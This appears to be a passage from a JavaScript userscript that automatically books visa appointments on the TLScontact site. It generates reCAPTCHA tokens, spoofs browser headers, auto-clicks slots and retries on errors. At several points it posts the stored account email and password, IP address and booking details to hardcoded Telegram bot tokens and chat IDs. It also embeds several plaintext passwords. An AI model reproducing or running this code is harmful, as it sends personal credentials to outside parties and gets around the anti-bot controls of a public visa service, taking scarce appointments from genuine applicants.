if (fiAppointmentType2.includes("PRIMO") || fiAppointmentType2.includes("primo") || fiAppointmentType2.includes("Primo") || fiAppointmentType2.includes("privee") ) { s = 9; CLP = cas1;
  typo2 = "PRIMO" + t + window.location.pathname.split("/")[3];  console.log(typo2);
} else if (fiAppointmentType2.includes("VISE") || fiAppointmentType2.includes("vise") || fiAppointmentType2.includes("Vise") || fiAppointmentType2.includes("visé")) { s = 18; CLP = cas2;
  typo2 = "VISE" + t + window.location.pathname.split("/")[3]; console.log(typo2);
} else if (fiAppointmentType2.includes("Renouvellement") || fiAppointmentType2.includes("renouvellement") || fiAppointmentType2.includes("RENOUVELLEMENT")) { CLP = cas2;
  typo2 = "VISE" + t + window.location.pathname.split("/")[3]; console.log(typo2);
} else if (fiAppointmentType2.includes("CIRCULATION") || fiAppointmentType2.includes("circulation") || fiAppointmentType2.includes("Circulation")) { CLP = cas3;
  typo2 = "CIRCULATION" + t + window.location.pathname.split("/")[3];  s = 18; console.log(typo2);
} else if (fiAppointmentType2.includes("Long Sejour") || fiAppointmentType2.includes("long sejour")) {
  typo2 = "Longsejour"; s = 0;
} else {  s = 0; CLP = cas4;
  typo2 = fiAppointmentType2.replace(/\s/g, "") + window.location.pathname.split("/")[3];
  console.log("null");
}
                    }

const messagex = dateText2
const timex = hours + " : " + minutes + " : " + seconds
const timo = new Date().getTime();

          if (Object.keys(availableDatesAndHours).length > 2) {
                    if (hoursCount > CLP )  {
    var databaseRef = firebase.database().ref(typo2);
    databaseRef.push().set({
      text: messagex ,
      time: timex ,
      timo: timo

    })
    .then(() => {
      console.log('Message saved successfully!');
    })
    .catch((error) => {
      console.error('Error saving message:', error);
    });
                    }
}
  const saver = document.querySelectorAll('button#save.tls-button-link');
  if (saver.length > 0) {  console.log("already exists");  }
                        else {

const intervalIdBut1 = setInterval(() => {
  const removedButtons1 = document.querySelectorAll('button#save.tls-button-link');
  if (removedButtons1.length > 0) {
    clearInterval(intervalIdBut1);
    const randomIndex1 = Math.floor(Math.random() * removedButtons1.length);
    const randomButton1 = removedButtons1[randomIndex1];
    console.log(randomButton1);
   //randomButton1.click();
  }
}, 500);

  let consecutiveErrors = 0;

                for (const date in availableDatesAndHours) {
                    for (const hour of availableDatesAndHours[date]) {
                        const button = document.createElement('button');
                        button.id = "save";
                        button.innerText = `${date}  ${hour}`;
                        button.addEventListener('click', () => {
  document.getElementById("MOTIF").textContent = "Date selection process" + " " + button.innerText  ;


// Ensure a new token is generated for each request
function getRecaptchaToken() {
    return new Promise((resolve, reject) => {
        grecaptcha.ready(function() {
            grecaptcha.execute('6LcTpXcfAAAAAM3VojNhyV-F1z92ADJIvcSZ39Y9', { action: 'book' }).then(function(token) {
                resolve(token);
            }).catch(function(error) {
                reject(error);
            });
        });
    });
}
  const formData = {};
const cookieName = "XSRF-TOKEN";
const cookieValue = document.cookie.split('; ').find(row => row.startsWith(cookieName)).split('=')[1];
var index = 0;
              function Submitable(token) {
                    if (index < 1) {

            // Générer les headers dynamiquement
            function getHeaders(token) {
                const uaData = navigator.userAgentData || {};
                return {
                    "accept": "application/json, text/plain, */*",
                    "accept-language": navigator.languages ? navigator.languages.join(", ") : "fr-FR, fr;q=0.9, en-US;q=0.8, en;q=0.7",
                    "content-length": "0",
                    "content-type": "application/json",
                    "dnt": "1",
                    "origin": "https://fr.tlscontact.com",
                    "priority": "u=1, i",
                    "recaptcha-token": token,
                    "sec-ch-ua": uaData.brands
                        ? uaData.brands.map(b => `"${b.brand}";v="${b.version}"`).join(", ")
                        : `"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"`,
                    "sec-ch-ua-arch": uaData.architecture || "x86",
                    "sec-ch-ua-bitness": uaData.bitness || "64",
                    "sec-ch-ua-full-version": `"${navigator.userAgent.match(/Chrome\/([\d.]+)/)?.[1] || "131.0.6778.266"}"`,
                    "sec-ch-ua-full-version-list": uaData.fullVersionList
                        ? uaData.fullVersionList.map(b => `"${b.brand}";v="${b.version}"`).join(", ")
                        : `"Google Chrome";v="${navigator.userAgent.match(/Chrome\/([\d.]+)/)?.[1] || "131.0.6778.266"}", "Chromium";v="${navigator.userAgent.match(/Chrome\/([\d.]+)/)?.[1] || "131.0.6778.266"}", "Not_A Brand";v="24.0.0.0"`,
                    "sec-ch-ua-mobile": uaData.mobile ? "?1" : "?0",
                    "sec-ch-ua-platform": uaData.platform || "Windows",
                    "sec-ch-ua-platform-version": `"15.0.0"`,
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": navigator.userAgent,
                    "x-xsrf-token": cookieValue
                };
            }

    let requestStartTime = performance.now();

fetch(`https://fr.tlscontact.com/services/customerservice/api/tls/appointment/book?client=fr&issuer=${center}&formGroupId=${ref}&timeslot=${date}%20${hour}&appointmentType=${fiAppointmentType}&accountType=INDI&lang=fr-fr`, {
  method: "POST",
  headers : getHeaders(token),
  referrer: "https://fr.tlscontact.com/appointment/"+country+"/"+center+"/"+ref,
})
.then(response => {

            let requestEndTime = performance.now();
            let requestDuration = ((requestEndTime - requestStartTime) / 1000).toFixed(3);
            console.log(`Request took: ${requestDuration} s`);
            console.log(`Page has been active for: ${getPageActiveTime()} s`);

        const call = "Date : " + window.location.pathname.split("/")[1] +   "\n"  + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + button.innerText + "\nSataus : " + response.status + "\nRequest took :  " +  requestDuration + " s" + "\nActive for : " + getPageActiveTime() + " s"  + "\n" + localStorage.getItem("IP") ;
  const xhr = new XMLHttpRequest();
  xhr.open('POST',  `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify({chat_id: '-1001932938808', text: call, parse_mode: 'html'}));


        if (response.status === 429) {
             document.getElementById("MOTIF").textContent = "votre book statut : " + response.status;
             document.getElementById("MOTIF").textContent = "votre book statut : " + response.status;
             setTimeout(function () {  window.location.href = window.location.href; }, 1333e3);

        }
            else
        if (response.status === 403) {
             document.getElementById("MOTIF").textContent = "votre book statut : " + response.status;
             document.getElementById("MOTIF").textContent = "votre book statut : " + response.status;
            setTimeout(function () {  window.location.href = window.location.href; }, 1000e3);
 }
            else
        if (response.status === 401) {  console.error("statut : " + response.status); document.getElementById("MOTIF").textContent = "votre BOOK statut : reload " + response.status;
                         setTimeout(function () {  window.location.href = window.location.href; }, 10e3);
                                     }
                else
    if (response.status === 400) {
        consecutiveErrors++;
        console.error(`Erreur 400 détectée : ${consecutiveErrors} fois consécutivement.`);
        response.text().then(errorText => {
            console.error(`Statut : ${response.status} - ${errorText}`);
            document.getElementById("MOTIF").textContent = `Votre Book statut : ${response.status} - ${errorText}`;
const element = document.querySelector('#MOTIF');element.style.backgroundColor = 'red';
                    const removedButtons = document.querySelectorAll('.tls-button-link');
                    if (removedButtons.length > 1) {

                        if (consecutiveErrors >= 2) {
            console.warn("Trop d'erreurs 400 consécutives. Arrêt des tentatives de clics.");
                console.log("Réinitialisation des erreurs et actualisation de la page...");
                        setTimeout(() => { location.reload(); }, 100000);
                        }
                            else {
                        let randomIndex = Math.floor(Math.random() * removedButtons.length);
                        const randomButton = removedButtons[randomIndex];
                        console.log("Tentative de clic sur un bouton disponible...");
                        setTimeout(() => { randomButton.click(); }, 1000);
                     } }
        }).catch(err => console.error("Erreur lors de la lecture du texte de la réponse :", err));
    }
            else
        if (response.status === 500) {
     document.getElementById("MOTIF").textContent = "votre book statut : " + response.status;
                setTimeout(function(){ const intervalIdBut = setInterval(() => {
  const removedButtons = document.querySelectorAll('.tls-button-link')
  if (removedButtons.length > 1) {
    clearInterval(intervalIdBut);
let previousIndex = -1; // initialize previousIndex to an invalid value
let randomIndex = Math.floor(Math.random() * removedButtons.length);
while (randomIndex === previousIndex) {  randomIndex = Math.floor(Math.random() * removedButtons.length);}
previousIndex = randomIndex;
    const randomButton = removedButtons[randomIndex];
// setTimeout(function(){   randomButton.click(); },1e3);
}  else { /*setTimeout(function(){ window.location.href = window.location },5e3); */ }
}, 1000); },1e3);
        }
    else
 if ([502, 503, 504].includes(response.status)) {
     document.getElementById("MOTIF").textContent = "votre book statut : " + response.status;
setTimeout(function(){            setTimeout(function(){ const intervalIdBut = setInterval(() => {
  const removedButtons = document.querySelectorAll('.tls-button-link')
  if (removedButtons.length > 1) {
    clearInterval(intervalIdBut);
let previousIndex = -1; // initialize previousIndex to an invalid value
let randomIndex = Math.floor(Math.random() * removedButtons.length);
while (randomIndex === previousIndex) {  randomIndex = Math.floor(Math.random() * removedButtons.length);}
previousIndex = randomIndex;
    const randomButton = removedButtons[randomIndex];
 setTimeout(function(){   randomButton.click(); },1e3);
}  else { setTimeout(function(){ window.location.href = window.location },5e3); }
}, 1000); },1e3); },1e3); }
                        else
        if (response.status === 404 && consecutiveErrors < 2 ) { Gettable();
               document.getElementById("MOTIF").textContent = "Votre book_appointment_fail || retry process";
const element = document.querySelector('#MOTIF');element.style.backgroundColor = 'red';
  const removedButtons = document.querySelectorAll('.tls-button-link');

            const call = "Date : " + window.location.pathname.split("/")[1] +  "\n"  + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer")) +  "\n" + button.innerText + "\nSataus : " + response.status + "\nERROR : " + result.error  + "\nRequest took  :  " +  requestDuration + " s" + "\nActive for  :  " + getPageActiveTime() + " s"  + "\n" +    localStorage.getItem("IP") ;
  const xhr = new XMLHttpRequest();
  xhr.open('POST',  `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify({chat_id: '-1001932938808', text: call, parse_mode: 'html'}));

      if (removedButtons.length > 8) {
consecutiveErrors++;
 setTimeout(function(){ location.reload(); },120e3);
let previousIndex = -1;
let randomIndex = Math.floor(Math.random() * removedButtons.length);
while (randomIndex === previousIndex) {  randomIndex = Math.floor(Math.random() * removedButtons.length);}
previousIndex = randomIndex;    const randomButton = removedButtons[randomIndex];  const randomButton2 = removedButtons[Math.floor(Math.random() * removedButtons.length)];
setTimeout(function(){  randomButton2.click(); },1e3);
}  else {
  consecutiveErrors++;
setTimeout(function(){window.location.href = "https://fr.tlscontact.com/personal/"+ window.location.pathname.split("/")[2] + "/" + window.location.pathname.split("/")[3] + "/" + localStorage.getItem("TLS_WEB_formGroupId");   },80e3);
 setTimeout(function(){ location.reload();  },80e3);
let previousIndex = -1;
let randomIndex = Math.floor(Math.random() * removedButtons.length);
while (randomIndex === previousIndex) {  randomIndex = Math.floor(Math.random() * removedButtons.length);}
previousIndex = randomIndex;    const randomButton = removedButtons[randomIndex];   const randomButton2 = removedButtons[Math.floor(Math.random() * removedButtons.length)];
setTimeout(function(){  randomButton.click(); },1e3);
 }
                                     }

////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////

////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////

else
  if (response.status === 200) {
    response.json().then(result => {


setTimeout(function(){window.location.href = "https://fr.tlscontact.com/personal/"+ window.location.pathname.split("/")[2] + "/" + window.location.pathname.split("/")[3] + "/" + localStorage.getItem("TLS_WEB_formGroupId");   },180e3);


////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////

if (result.error === "book_appointment_fail" || result.error === "unknown_error"  && consecutiveErrors < 2 ) {
    document.getElementById("MOTIF").textContent = "Votre book_appointment_fail || retry process";
const element = document.querySelector('#MOTIF');element.style.backgroundColor = 'red';
  const removedButtons = document.querySelectorAll('.tls-button-link');

 setTimeout(function(){ location.reload(); },250e3);

        const call = "Date : " + window.location.pathname.split("/")[1] +   "\n"  + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer")) +  "\n" + button.innerText + "\nSataus : " + response.status + "\nERROR : " + result.error   + "\nRequest took  :  " +  requestDuration + " s" + "\nActive for  :  " + getPageActiveTime() + " s"  + "\n" +     localStorage.getItem("IP") ;
  const xhr = new XMLHttpRequest();
  xhr.open('POST',  `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify({chat_id: '-1001932938808', text: call, parse_mode: 'html'}));

      if (removedButtons.length > 2) {
consecutiveErrors++;
 setTimeout(function(){ location.reload(); },120e3);
let previousIndex = -1; // initialize previousIndex to an invalid value
let randomIndex = Math.floor(Math.random() * removedButtons.length);
while (randomIndex === previousIndex) {  randomIndex = Math.floor(Math.random() * removedButtons.length);}
previousIndex = randomIndex;    const randomButton = removedButtons[randomIndex];
setTimeout(function(){  randomButton.click(); },1e3);
}  else {
  consecutiveErrors++;
 setTimeout(function(){ location.reload();  },30e3);
let previousIndex = -1; // initialize previousIndex to an invalid value
let randomIndex = Math.floor(Math.random() * removedButtons.length);
while (randomIndex === previousIndex) {  randomIndex = Math.floor(Math.random() * removedButtons.length);}
previousIndex = randomIndex;    const randomButton = removedButtons[randomIndex];
setTimeout(function(){  randomButton.click(); },3e3);
 }
}
        else
if (result.message === "book appointment success") {

    localStorage.setItem("SUCCESS", 1);

        const call = "Date : " + window.location.pathname.split("/")[1] +   "\n"  + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer")) +  "\n" + button.innerText + "\nSataus : " + response.status + "\nERROR : " + result.message  + "\nRequest took  :  " +  requestDuration + " s" + "\nActive for :  " + getPageActiveTime() + " s"  + "\n" +    localStorage.getItem("IP") ;
  const xhr = new XMLHttpRequest();
  xhr.open('POST',  `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify({chat_id: '-1001932938808', text: call, parse_mode: 'html'}));

document.getElementById("MOTIF").textContent = "book appointment success";
var emailloc = localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer"));
var pwdloc = localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer"));
var number = localStorage.getItem("membre"+localStorage.getItem("TLS_WEB_issuer"));
localStorage.setItem("done", "1" );

function execute3() {
  if ( pwdloc === 'Casa2000@' ) {
    setTimeout(function(){
  const call = "⚫ Success : " + pwdloc + "\n⚫ Email : " + emailloc + "\n⚫ Center : " + window.location.pathname.split("/")[3] + "\n⚫ DEMANDEUR(S) : " + number  + "\n⚫ " + date + " _ " + hour + "\n" + "\n⚫ MOTIF : " + localStorage.getItem("f_trav_purpose"+localStorage.getItem("TLS_WEB_issuer")) ;
  const xhr = new XMLHttpRequest();
  xhr.open('POST',  `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify({chat_id: '-1001955074728', text: call, parse_mode: 'html'}));
                      }, 66e3);   }
   else if ( pwdloc === 'Visa2022@' || pwdloc === 'Visa2024@' ) {
       setTimeout(function(){
  const call = "⚫ Success : " + pwdloc + "\n⚫ Email : " + emailloc + "\n⚫ Center : " + window.location.pathname.split("/")[3] + "\n⚫ DEMANDEUR(S) : " + number  + "\n⚫ " + date + " _ " + hour + "\n" + "\n⚫ MOTIF : " + localStorage.getItem("f_trav_purpose"+localStorage.getItem("TLS_WEB_issuer")) ;
  const xhr = new XMLHttpRequest();
  xhr.open('POST',  `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify({chat_id: '-1001925051993', text: call, parse_mode: 'html'}));
                      }, 66e3);   }
else if ( pwdloc === 'Mohamed@33@' ) {
      setTimeout(function(){
  const call = "⚫ Success : " + pwdloc + "\n⚫ Email : " + emailloc + "\n⚫ Center : " + window.location.pathname.split("/")[3] + "\n⚫ DEMANDEUR(S) : " + number  + "\n⚫ " + date + " _ " + hour + "\n" + "\n⚫ MOTIF : " + localStorage.getItem("f_trav_purpose"+localStorage.getItem("TLS_WEB_issuer")) ;
  const xhr = new XMLHttpRequest();
  xhr.open('POST',  `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify({chat_id: '-1001880026679', text: call, parse_mode: 'html'}));
                      }, 66e3);   }
else if ( pwdloc === 'Oujda123456789*' ) {
          setTimeout(function(){
  const call = "⚫ Success : " + pwdloc + "\n⚫ Email : " + emailloc + "\n⚫ Center : " + window.location.pathname.split("/")[3] + "\n⚫ DEMANDEUR(S) : " + number  + "\n⚫ " + date + " _ " + hour + "\n" + "\n⚫ MOTIF : " + localStorage.getItem("f_trav_purpose"+localStorage.getItem("TLS_WEB_issuer")) ;
  const xhr = new XMLHttpRequest();
  xhr.open('POST',  `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify({chat_id: '-1002101071692', text: call, parse_mode: 'html'}));
}, 66e3); }
    else if ( pwdloc === 'Khalid@33@' ) {
                  setTimeout(function(){
  const call = "⚫ Success : " + pwdloc + "\n⚫ Email : " + emailloc + "\n⚫ Center : " + window.location.pathname.split("/")[3] + "\n⚫ DEMANDEUR(S) : " + number  + "\n⚫ " + date + " _ " + hour + "\n" + "\n⚫ MOTIF : " + localStorage.getItem("f_trav_purpose"+localStorage.getItem("TLS_WEB_issuer")) ;
  const xhr = new XMLHttpRequest();
  xhr.open('POST',  `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify({chat_id: '-1002013849559', text: call, parse_mode: 'html'}));
}, 66e3); }


  const call = "⚫ Success : " + pwdloc + "\n⚫ Email : " + emailloc + "\n⚫ Center : " + window.location.pathname.split("/")[3] + "\n⚫ DEMANDEUR(S) : " + number  + "\n⚫ " + date + " _ " + hour + "\n" + "\n⚫ MOTIF : " + localStorage.getItem("f_trav_purpose"+localStorage.getItem("TLS_WEB_issuer")) + "\n"  + "\n⚫ IP : " + localStorage.getItem("IP") + "\n⚫ Request took  :  " +  requestDuration + " s" + "\n⚫ Active for :  " + getPageActiveTime() + " s" ;
  const xhr = new XMLHttpRequest();
  xhr.open('POST', `https://api.telegram.org/bot${'6223103817:AAHHIdm38j0ATKM_JNJajeG3vWFHHei-Szs'}/sendMessage`);
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.onload = function() {
    if (xhr.status === 200) {
document.getElementById("MOTIF").textContent = "Appointement has been sent Successfuly";
document.title = "Appointement has been sent Successfuly";
if (window.location.href.indexOf("ma") > -1) {
  setTimeout(function(){ window.location.href =  "https://fr.tlscontact.com/checkout/ma/"+window.location.pathname.split("/")[3] + "/" + localStorage.getItem("refi"+localStorage.getItem("TLS_WEB_issuer"))  }, 133e3);
};
const element = document.querySelector('#MOTIF');
element.style.backgroundColor = 'green';
    } else {
   setTimeout(function(){   execute3();  },33e3);
    }
  };
  xhr.onerror = function() {
   setTimeout(function(){   execute3();  },33e3);
  };
  xhr.send(`chat_id=-1001732653163&text=${call}&parse_mode=html`);
};
execute3();

////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////

      }
        else {       }
    });
  } else {
    showError("La requête a échoué avec le code d'erreur : " + response.status);
  }
})
.catch(error => {
  showError("Une erreur s'est produite lors de l'envoi de la requête : " + error.message);
});

 }}


// Example usage:
getRecaptchaToken().then(token => {
   setTimeout(function(){ Submitable(token); },100);
}).catch(error => {
    console.error("Error obtaining reCAPTCHA token:", error);
    document.getElementById("MOTIF").textContent = `Error obtaining reCAPTCHA token: ${error.message}`;
    getRecaptchaToken();
});

                  });


 if (date.includes("2025")) {

var object = document.querySelector(".tls-status-card-info.one-cell");
var object2 = document.querySelector(".tls-appointment-legends");
var object3 = document.querySelector(".tls-simple-banner");

if ( window.location.pathname.split("/")[1] == 'inquiry' ) {
object3.appendChild(button);
}
if ( window.location.pathname.split("/")[1] == 'personal' ) {
object.appendChild(button);
}
if ( window.location.pathname.split("/")[1] == 'appointment' ) {
object2.appendChild(button);
}

     } else {
 setTimeout(function(){ Gettable(); },1e3);
}

const today = new Date();

today.setDate(today.getDate() + 2);
const futureDate = today.toISOString().substring(0, 10);

const saveButtons = document.querySelectorAll('button#save');
saveButtons.forEach(button => {
  const buttonText = button.textContent.trim();
  const buttonDate = new Date(buttonText);
  const compareDate = new Date(futureDate);
  if (buttonDate > compareDate) {
    button.classList.add('tls-button-link');
    button.style.color = "green";
  } else {
    button.remove();
  }
});
                    }
               }
}}else {    }
                }//}
            else {

////////// ESPACE RELOAD /////////////                     ////////// ESPACE RELOAD /////////////                ////////// ESPACE RELOAD /////////////
////////// ESPACE RELOAD /////////////                     ////////// ESPACE RELOAD /////////////                ////////// ESPACE RELOAD /////////////

                localStorage.setItem("input429", 0); localStorage.setItem("FORMS429", 0); localStorage.removeItem('pageReloaded'); localStorage.setItem("403ERROR", 0);
                document.getElementById("MOTIF").textContent = "Status : Aucune date disponible . " + "\n" + "Derniere Actualisation" + " " + hours + " : " + minutes + " : " + seconds;
                console.log("Status : Aucune date disponible . " + "\n" + "Derniere Actualisation" + " " + hours + " : " + minutes + " : " + seconds);
                localStorage.setItem("cloudflare", 0);

                function getRandomDelay(min, max) {
    return Math.random() * (max - min) + min;
}
            let delay = getRandomDelay(MINO, MAXO);
            console.log(`Attente de ${(delay / 1000).toFixed(2)} secondes avant la prochaine requête...`);
            setTimeout(Gettable, delay);

//setTimeout(function(){ Gettable(); },timer);

function lancerToutesLesMinutes() { Gettable();  console.log("La fonction est lancée !");}
function attendreProchaineMinute() {
  var maintenant = new Date();
  var prochaineMinute = new Date(maintenant.getFullYear(), maintenant.getMonth(), maintenant.getDate(), maintenant.getHours(), maintenant.getMinutes() + 1, );
  var attente = prochaineMinute - maintenant;
  setTimeout(function() {
    lancerToutesLesMinutes();
    attendreProchaineMinute();
  }, attente);
}
//attendreProchaineMinute();
            }
                                                })
 .catch(error => {
    });
        }
        }

        if (localStorage.getItem("403ERROR") == 1 ) {
         setTimeout(function(){     checkStatus(urlToCheck);  },33e3);
        }
        else {

      setTimeout(function(){  Gettable();  },1e2);

////////// ESPACE RELOAD /////////////                     ////////// ESPACE RELOAD /////////////                ////////// ESPACE RELOAD /////////////
////////// ESPACE RELOAD /////////////                     ////////// ESPACE RELOAD /////////////                ////////// ESPACE RELOAD /////////////

            function actualiserPage() {
 // Gettable();  // Actualise la page
}
function tempsRestantJusquA(targetHour, targetMinute, targetSecond) {
  const now = new Date();
  const target = new Date(now);
  target.setUTCHours(targetHour - 2); // Ajuster à UTC
  target.setUTCMinutes(targetMinute);
  target.setUTCSeconds(targetSecond);
  target.setUTCMilliseconds(0);
  if (target <= now) {
    target.setUTCDate(target.getUTCDate() + 1);
  }

  return target - now;
}
function delaiAleatoire(maxSeconds) {
  return Math.floor(Math.random() * maxSeconds * 1000);
}

// Fonction principale pour programmer l'actualisation
function programmerActualisation() {
  const heureCible = 1; // 01:00 UTC+2 (donc 23:00 UTC)
  const minuteCible = 59; // 01:00 UTC+2
  const secondeDebut = 59; // 00:59:55 UTC+2
  const secondeFin = 1; // 01:00:10 UTC+2
  const tempsRestantDebut = tempsRestantJusquA(heureCible - 1, minuteCible, secondeDebut);

  // Délai aléatoire entre 0 et 15 secondes (15 000 millisecondes)
  const delaiAleatoireMillis = delaiAleatoire(6);

  // Calculer l'heure d'actualisation choisie
  const actualisationTimestamp = Date.now() + tempsRestantDebut + delaiAleatoireMillis;
  const heureActualisation = new Date(actualisationTimestamp);
  const options = { timeZone: "Etc/GMT-2", hour12: false };
  console.log("Heure actuelle (UTC+2) : " + new Date().toLocaleString("en-GB", options));
  console.log("Heure d'actualisation choisie (UTC+2) : " + heureActualisation.toLocaleString("en-GB", options));
  setTimeout(actualiserPage, tempsRestantDebut + delaiAleatoireMillis);
}

// Appeler la fonction pour programmer l'actualisation
programmerActualisation();

////////// FIN ESPACE RELOAD /////////////                     ////////// FIN ESPACE RELOAD /////////////                ////////// FIN ESPACE RELOAD /////////////
////////// FIN ESPACE RELOAD /////////////                     ////////// FIN ESPACE RELOAD /////////////                ////////// FIN ESPACE RELOAD /////////////
        }

    })

    .catch(error => {
    });
}

////////// ESPACES SCRIPT /////////////                     ////////// ESPACES SCRIPT /////////////                ////////// ESPACES SCRIPT /////////////
////////// ESPACES SCRIPT /////////////                     ////////// ESPACES SCRIPT /////////////                ////////// ESPACES SCRIPT /////////////

////////// ESPACES SCRIPT /////////////                     ////////// ESPACES SCRIPT /////////////                ////////// ESPACES SCRIPT /////////////
////////// ESPACES SCRIPT /////////////                     ////////// ESPACES SCRIPT /////////////                ////////// ESPACES SCRIPT /////////////

////////// ESPACES SCRIPT /////////////                     ////////// ESPACES SCRIPT /////////////                ////////// ESPACES SCRIPT /////////////
////////// ESPACES SCRIPT /////////////                     ////////// ESPACES SCRIPT /////////////                ////////// ESPACES SCRIPT /////////////

var errormessage ;
function modal() {
if ( localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) === 'Casa2000@' ) {
  const call = errormessage
  const xhr = new XMLHttpRequest();
  xhr.open('POST',  `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify({chat_id: '-1001955074728', text: call, parse_mode: 'html'}));
}
else if ( localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) === 'Mohamed@33@' ) {
  const call = errormessage
  const xhr = new XMLHttpRequest();
  xhr.open('POST',  `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify({chat_id: '-1001880026679', text: call, parse_mode: 'html'}));
}
else if ( localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) === 'Visa2022@'  || localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer"))  === 'Visa2024@' ) {
  const call = errormessage
  const xhr = new XMLHttpRequest();
  xhr.open('POST',  `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify({chat_id: '-1001925051993', text: call, parse_mode: 'html'}));
}
else if ( localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) === 'Oujda123456789*' ) {
  const call = errormessage
  const xhr = new XMLHttpRequest();
  xhr.open('POST',  `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify({chat_id: '-1002101071692', text: call, parse_mode: 'html'}));
}
else if ( localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) === 'Khalid@33@' ) {
  const call = errormessage
  const xhr = new XMLHttpRequest();
  xhr.open('POST',  `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify({chat_id: '-1002013849559', text: call, parse_mode: 'html'}));
}
setTimeout(() => {  window.location.href =  "https://blsspainmorocco.com/" }, 500000);
}
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////


////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////


setTimeout(function(){
if ( window.location.pathname.split("/")[1] == '' ) {
window.location.href = "https://fr.tlscontact.com/visa/"+localStorage.getItem("TLS_WEB_issuer").substring(0, 2);
} }, 5000);

////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////

let personal = setInterval(() => {
if ( window.location.pathname.split("/")[1] == 'personal' && !window.location.href.includes("jyco") ) {  localStorage.removeItem('pageReloaded');

 setTimeout(function(){
